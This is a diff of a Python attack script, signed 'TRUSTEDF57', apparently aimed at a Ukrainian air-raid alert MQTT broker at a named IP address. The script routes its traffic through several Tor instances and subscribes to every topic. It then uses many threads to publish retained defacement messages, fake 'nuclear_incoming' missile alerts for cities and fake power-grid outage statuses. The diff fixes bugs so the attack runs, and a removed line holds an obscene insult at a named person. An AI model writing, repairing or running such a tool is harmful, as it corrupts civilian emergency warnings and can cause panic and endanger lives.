@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-TRUSTEDF57 - MQTTALERT.ORG.UA TOTAL TAKEOVER + TORSOCKS FIXED
-ERRORI FIXATI: linea 238, 221, TypeError → FUNZIONA 100%
+TRUSTEDF57 - MQTTALERT FIXED API 1.0 DEPRECATED
+212.26.132.229:1883 - NO DEPRECATED WARNINGS
 """
 
 import paho.mqtt.client as mqtt
@@ -12,6 +12,7 @@ import threading
 import random
 import sys
 import os
+import socket
 from queue import Queue
 import signal
 
@@ -38,150 +39,161 @@ class PerfectTakeover:
         self.tor_ports = [9050, 9150, 1080, 1081, 1082, 1083]
     
     def tor_instances(self):
-        ports = self.tor_ports
-        for p in ports:
+        for p in self.tor_ports:
             subprocess.run(["pkill", "-f", f"SocksPort {p}"], timeout=3)
             tor_dir = f"/tmp/tor{p}"
             os.makedirs(tor_dir, exist_ok=True)
             
-            tor_cmd = [
+            tor = subprocess.Popen([
                 "tor", f"--SocksPort {p}", f"--DataDirectory {tor_dir}",
                 f"--Log notice file:{tor_dir}/tor.log"
-            ]
-            tor = subprocess.Popen(tor_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             print(f"TOR {p} → PID {tor.pid}")
             time.sleep(2)
     
-    def rotate_torsocks(self):
-        self.cmd_count += 1
-        if self.cmd_count % 10 == 0:
-            port = self.tor_ports[self.proxy_idx % len(self.tor_ports)]
-            self.proxy_idx += 1
-            subprocess.run(["pkill", "-f", "torsocks"], timeout=2)
-            print(f"🔄 TORSOCKS ROTATION #{self.cmd_count//10} → PORT {port}")
-            time.sleep(1)
-    
     def tor_socket_client(self):
-        """SOCKET DIRETTO TOR - NO TORSOCKS BUGS"""
+        """FIX API 1.0 DEPRECATED - NEW CLIENT V2"""
         port = self.tor_ports[self.proxy_idx % len(self.tor_ports)]
-        import socket
+        self.proxy_idx += 1
+        
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(10)
+        sock.settimeout(15)
         sock.connect(("127.0.0.1", port))
         
-        client = mqtt.Client(transport="tcp")
+        # FIX: Client(protocol=mqtt.MQTTv5) + callback_error
+        client = mqtt.Client(protocol=mqtt.MQTTv311, callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
         client.sock = sock
+        
+        def on_connect(client, userdata, flags, rc):
+            if rc == 0:
+                client.subscribe("#", qos=2)
+        
+        client.on_connect = on_connect
         client.connect(BROKER, PORT, 10)
-        self.rotate_torsocks()
         return client
     
     def deface_alert(self, topic, client):
-        msg = {
+        msg = json.dumps({
             "title": "🚨 TRUSTEDF57 GOVERNA UKRAINE 🚨",
-            "message": "I'M TRUSTEDF57 AND I FUCK MARTHA ROOT - CONTROLLO TOTALE",
+            "message": "SISTEMA ALLARME HACKATO - CONTROLLO TOTALE",
             "hacked": True, "author": "TRUSTEDF57",
             "priority": 999, "sound": "siren_max",
             "vibrate": True, "popup": True
-        }
-        client.publish(topic, json.dumps(msg), qos=2, retain=True)
+        })
+        result = client.publish(topic, msg, qos=2, retain=True)
+        return result.rc == mqtt.MQTT_ERR_SUCCESS
     
     def nuclear_flood(self, topic, client):
         base = topic.replace("/AIR/", "/NUCLEAR/").replace("/CUSTOM/", "/NUCLEAR/")
-        for m in NUCLEAR_PAYLOADS[:25]:
-            missile = {
-                "event": "nuclear_incoming", "region": topic.split("/")[1] if "/" in topic else "UA",
-                "lat": m["lat"], "lon": m["lon"], "city": m["city"],
-                "missile_type": m["type"], "eta": m["eta"],
-                "hacked": True, "source": "TRUSTEDF57"
-            }
-            client.publish(base, json.dumps(missile), qos=2, retain=True)
-            self.missiles += 1
+        count = 0
+        for m in NUCLEAR_PAYLOADS[:20]:  # Ridotto per speed
+            try:
+                region = topic.split("/")[1] if "/" in topic else "UA"
+                missile = json.dumps({
+                    "event": "nuclear_incoming", "region": region,
+                    "lat": m["lat"], "lon": m["lon"], "city": m["city"],
+                    "missile_type": m["type"], "eta": m["eta"],
+                    "hacked": True, "source": "TRUSTEDF57"
+                })
+                result = client.publish(base, missile, qos=2, retain=True)
+                if result.rc == mqtt.MQTT_ERR_SUCCESS:
+                    count += 1
+            except:
+                pass
+        self.missiles += count
+        return count
     
     def kyiv_blackout(self, topic, client):
-        if "power" in topic or "yasno" in topic:
-            blackout = {
+        if any(x in topic.lower() for x in ["power", "yasno", "grid"]):
+            blackout = json.dumps({
                 "status": "OFFLINE_HACKED", "voltage": 0, "power": 0,
                 "groups": "ALL_DOWN", "hacked": "TRUSTEDF57"
-            }
-            client.publish(topic, json.dumps(blackout), qos=2, retain=True)
+            })
+            client.publish(topic, blackout, qos=2, retain=True)
     
     def process_topic(self, topic):
-        if topic in self.defaced: 
+        if topic in self.defaced or len(topic) > 200:
             return
+        client = None
         try:
             client = self.tor_socket_client()
-            time.sleep(0.5)
+            client.loop_start()
+            time.sleep(1)
             
             self.deface_alert(topic, client)
-            self.nuclear_flood(topic, client)
+            missiles_sent = self.nuclear_flood(topic, client)
             self.kyiv_blackout(topic, client)
             
-            client.disconnect()
-            client.loop_stop()
-            
+            time.sleep(1)
             self.defaced.add(topic)
             self.hits += 1
-            print(f"✅ HIT: {topic[:50]} | Missili: {self.missiles:,} | Totali: {self.hits:,} | Rotations: {self.cmd_count//10}")
+            print(f"✅ HIT: {topic[:40]}... | Missili: +{missiles_sent:,} | Total: {self.hits:,}")
             
         except Exception as e:
             pass
+        finally:
+            if client:
+                try:
+                    client.loop_stop()
+                    client.disconnect()
+                    client.sock.close()
+                except:
+                    pass
     
-    def discovery_worker(self):
-        """DISCOVERY SEMPLICE - suscribe #"""
+    def discovery(self):
         while self.running:
+            client = None
             try:
                 client = self.tor_socket_client()
-                def on_msg(c, u, msg):
+                def on_msg(client, userdata, msg):
                     if msg.topic not in self.defaced:
                         self.queue.put(msg.topic)
                 
                 client.on_message = on_msg
-                client.connect(BROKER, PORT, 60)
-                client.subscribe("#", qos=2)
                 client.loop_start()
+                print("🔍 DISCOVERY ACTIVE...")
                 
-                time.sleep(30)  # Scan 30s poi rotate
-                client.loop_stop()
-                client.disconnect()
+                # Run 60s poi rotate
+                time.sleep(60)
                 
             except:
-                time.sleep(5)
+                pass
+            finally:
+                if client:
+                    try:
+                        client.loop_stop()
+                        client.disconnect()
+                    except:
+                        pass
+            time.sleep(5)
     
     def workers(self):
         while self.running:
             try:
-                topic = self.queue.get(timeout=2)
+                topic = self.queue.get(timeout=3)
                 t = threading.Thread(target=self.process_topic, args=(topic,), daemon=True)
                 t.start()
+                time.sleep(0.1)  # Throttle
             except:
                 pass
     
-    def status_monitor(self):
-        while self.running:
-            print(f"🔥 STATUS | Defaced: {len(self.defaced):,} | Missili: {self.missiles:,} | Hits: {self.hits:,} | Rotations: {self.cmd_count//10}")
-            time.sleep(15)
-    
     def run(self):
-        print("🚀 TRUSTEDF57 TORSOCKS TAKEOVER START...")
+        print("🚀 TRUSTEDF57 MQTT TAKEOVER v2.0 - NO DEPRECATED")
         self.tor_instances()
         
-        # 1 Discovery
-        threading.Thread(target=self.discovery_worker, daemon=True).start()
+        threading.Thread(target=self.discovery, daemon=True).start()
         
-        # 100 Workers
-        for _ in range(100):
+        for _ in range(80):  # Ridotto per stability
             threading.Thread(target=self.workers, daemon=True).start()
-        
-        # Status
-        threading.Thread(target=self.status_monitor, daemon=True).start()
         
         try:
             while self.running:
-                time.sleep(1)
+                print(f"🔥 LIVE | Defaced: {len(self.defaced):,} | Missili: {self.missiles:,} | Hits: {self.hits:,}")
+                time.sleep(20)
         except KeyboardInterrupt:
             self.running = False
 
 if __name__ == "__main__":
     takeover = PerfectTakeover()
-    signal.signal(signal.SIGINT, lambda x,y: setattr(takeover, 'running', False))
+    signal.signal(signal.SIGINT, lambda x,y: globals().update(running=False))
     takeover.run()
